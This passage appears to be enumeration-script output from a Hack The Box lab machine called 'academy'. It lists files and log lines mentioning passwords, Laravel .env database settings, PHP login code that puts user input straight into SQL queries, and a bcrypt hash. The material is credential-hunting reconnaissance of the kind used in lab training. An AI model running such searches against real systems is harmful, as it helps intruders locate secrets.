/var/log/installer/installer-journal.txt:Aug 07 12:03:04 ubuntu-server chpasswd[1827]: pam_unix(chpasswd:chauthtok): password changed for installer
/var/log/installer/installer-journal.txt:Aug 07 12:03:04 ubuntu-server cloud-init[1826]: Set the following 'random' passwords
/var/log/installer/installer-journal.txt:Aug 07 12:08:14 ubuntu-server chage[14286]: changed password expiry for sshd
/var/log/installer/installer-journal.txt:Aug 07 12:08:14 ubuntu-server usermod[14279]: change user 'sshd' password
/var/log/syslog.1:Nov 16 18:54:42 academy kernel: [    5.252853] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/syslog.1:Nov 16 18:54:42 academy systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
/var/log/syslog.1:Nov 16 18:54:42 academy systemd[1]: Started Dispatch Password Requests to Console Directory Watch.

[+] Finding emails inside logs (limit 70)
      4 /var/log/kern.log.1:giometti@linux.it                                                                                                                                                                
      4 /var/log/kern.log.1:dm-devel@redhat.com
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/syslog.1:giometti@linux.it
      1 /var/log/syslog.1:dm-devel@redhat.com
      1 /var/log/installer/installer-journal.txt:giometti@linux.it
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
      1 /var/log/dmesg:giometti@linux.it
      1 /var/log/dmesg:dm-devel@redhat.com
      1 /var/log/dmesg.0:giometti@linux.it
      1 /var/log/dmesg.0:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)
/usr/lib/systemd/system/systemd-ask-password-console.service                                                                                                                                                 
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
/usr/lib/systemd/system/systemd-ask-password-wall.service

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - only PHP files
Binary file (standard input) matches                                                                                                                                                                         

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - no PHP files
Binary file (standard input) matches                                                                                                                                                                         

[+] Finding possible password variables inside key folders (limit 140)
/var/www/html/academy/.env:APP_NAME=Laravel                                                                                                                                                                  
/var/www/html/academy/.env:DB_CONNECTION=mysql
/var/www/html/academy/.env:DB_DATABASE=academy
/var/www/html/academy/.env:DB_HOST=127.0.0.1
/var/www/html/academy/.env:DB_PORT=3306
/var/www/html/academy/.env:DB_USERNAME=dev
/var/www/html/academy/.env.example:APP_NAME=Laravel
/var/www/html/academy/.env.example:DB_CONNECTION=mysql
/var/www/html/academy/.env.example:DB_DATABASE=homestead
/var/www/html/academy/.env.example:DB_HOST=127.0.0.1
/var/www/html/academy/.env.example:DB_PORT=3306
/var/www/html/academy/.env.example:DB_USERNAME=homestead
/var/www/html/academy/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php:        $this->secretKey = $secretKey;
/var/www/html/academy/vendor/phpdocumentor/reflection-common/.github/workflows/push.yml:          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
/var/www/html/academy/vendor/phpunit/phpunit/.github/workflows/ci.yml:          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
/var/www/html/academy/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:            'app_name' => $this->name,
/var/www/html/htb-academy-dev-01/.env:APP_NAME=Laravel
/var/www/html/htb-academy-dev-01/.env:DB_CONNECTION=mysql
/var/www/html/htb-academy-dev-01/.env:DB_DATABASE=homestead
/var/www/html/htb-academy-dev-01/.env:DB_HOST=127.0.0.1
/var/www/html/htb-academy-dev-01/.env:DB_PORT=3306
/var/www/html/htb-academy-dev-01/.env:DB_USERNAME=homestead
/var/www/html/htb-academy-dev-01/.env.example:APP_NAME=Laravel
/var/www/html/htb-academy-dev-01/.env.example:DB_CONNECTION=mysql
/var/www/html/htb-academy-dev-01/.env.example:DB_DATABASE=homestead
/var/www/html/htb-academy-dev-01/.env.example:DB_HOST=127.0.0.1
/var/www/html/htb-academy-dev-01/.env.example:DB_PORT=3306
/var/www/html/htb-academy-dev-01/.env.example:DB_USERNAME=homestead
/var/www/html/htb-academy-dev-01/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php:        $this->secretKey = $secretKey;
/var/www/html/htb-academy-dev-01/vendor/phpdocumentor/reflection-common/.github/workflows/push.yml:          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
/var/www/html/htb-academy-dev-01/vendor/phpunit/phpunit/.github/workflows/ci.yml:          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
/var/www/html/htb-academy-dev-01/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:            'app_name' => $this->name,

[+] Finding possible password in config files
 /etc/sysctl.d/10-ptrace.conf                                                                                                                                                                                
credentials that exist in memory (re-using existing SSH connections,
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/overlayroot.conf
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/adduser.conf
passwd
 /etc/nsswitch.conf
passwd:         files systemd
 /etc/apache2/apache2.conf
passwd files from being

[+] Finding 'username' string inside key folders (limit 70)
/var/www/html/academy/config/database.php:            'username' => env('DB_USERNAME', 'forge'),                                                                                                             
/var/www/html/academy/config/logging.php:            'username' => 'Laravel Log',
/var/www/html/academy/config/mail.php:    'username' => env('MAIL_USERNAME'),
/var/www/html/academy/.env:DB_USERNAME=dev
/var/www/html/academy/.env.example:DB_USERNAME=homestead
/var/www/html/academy/.env.example:MAIL_USERNAME=null
/var/www/html/academy/.env:MAIL_USERNAME=null
/var/www/html/academy/public/admin.php:$query = "SELECT * FROM users where username='$username' AND password ='$password' AND roleid='1'";
/var/www/html/academy/public/admin.php:    $_SESSION["username"] = $row[1];
/var/www/html/academy/public/admin.php:$username = mysqli_real_escape_string($link, $_REQUEST['uid']);
/var/www/html/academy/public/login.php:$query = "SELECT * FROM users where username='$username' AND password ='$password'";
/var/www/html/academy/public/login.php:    $_SESSION["username"] = $row[1];
/var/www/html/academy/public/login.php:$username = mysqli_real_escape_string($link, $_REQUEST['uid']);
/var/www/html/academy/public/register.php:    $user_check_query = "SELECT * FROM academy.users WHERE username='$username' LIMIT 1";
/var/www/html/academy/public/register.php:$username = "";
/var/www/html/academy/public/register.php:    $username = mysqli_real_escape_string($link, $_POST['uid']);
/var/www/html/academy/public/register.php:        if ($user['username'] === $username) {
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = rtrim($username, '.');
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = static::bothify($this->generator->parse($format));
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = str_replace('..', '.', $username);
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = strtolower(static::transliterate($username));
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        if (trim($username, '._') === '') {
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php:    protected static $userNameFormats = array(
/var/www/html/academy/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php:        [$username, $password] = $credentials;
/var/www/html/academy/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:        [$username, $password] = [
/var/www/html/academy/vendor/laravel/framework/src/Illuminate/Database/README.md:    'username'  => 'root',
/var/www/html/academy/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:        $this->username = $username;
/var/www/html/academy/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        $username = $this->safeStorage->retrieveSafely('username');
/var/www/html/academy/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        return $username !== null ? $username : 'anonymous';
/var/www/html/academy/vendor/league/flysystem/src/Adapter/Ftp.php:                ) . ', username: ' . $this->getUsername()
/var/www/html/academy/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php:            'username' => null,
/var/www/html/academy/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:            $dataArray['username'] = $this->username;
/var/www/html/academy/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php:        $this->username = $username;
/var/www/html/academy/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$row['username'],
/var/www/html/academy/vendor/swiftmailer/swiftmailer/doc/plugins.rst:            '{username}'=>$user['username'],
/var/www/html/academy/vendor/swiftmailer/swiftmailer/doc/sending.rst:with ``setUsername()`` and ``setPassword()`` methods::
/var/www/html/academy/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php:        $this->username = $username;
/var/www/html/academy/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php:        $this->username = $username;
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'test';
/var/www/html/academy/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php:        $username = 'user';
/var/www/html/academy/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php:            $this->username = $params['user'];
/var/www/html/academy/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php:    private $username = '';
/var/www/html/htb-academy-dev-01/config/database.php:            'username' => env('DB_USERNAME', 'forge'),
/var/www/html/htb-academy-dev-01/config/logging.php:            'username' => 'Laravel Log',
/var/www/html/htb-academy-dev-01/config/mail.php:    'username' => env('MAIL_USERNAME'),
/var/www/html/htb-academy-dev-01/.env:DB_USERNAME=homestead
/var/www/html/htb-academy-dev-01/.env.example:DB_USERNAME=homestead
/var/www/html/htb-academy-dev-01/.env.example:MAIL_USERNAME=null
/var/www/html/htb-academy-dev-01/.env:MAIL_USERNAME=null
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = rtrim($username, '.');
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = str_replace('..', '.', $username);
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        if (trim($username, '._') === '') {
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php:    protected static $userNameFormats = array(
/var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:        list($username, $password) = [
/var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Database/README.md:    'username'  => 'root',
/var/www/html/htb-academy-dev-01/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:        $this->username = $username;

[+] Searching specific hashes inside files - less false positives (limit 70)
/var/www/html/academy/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm                                                                                        
/var/www/html/htb-academy-dev-01/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm

```

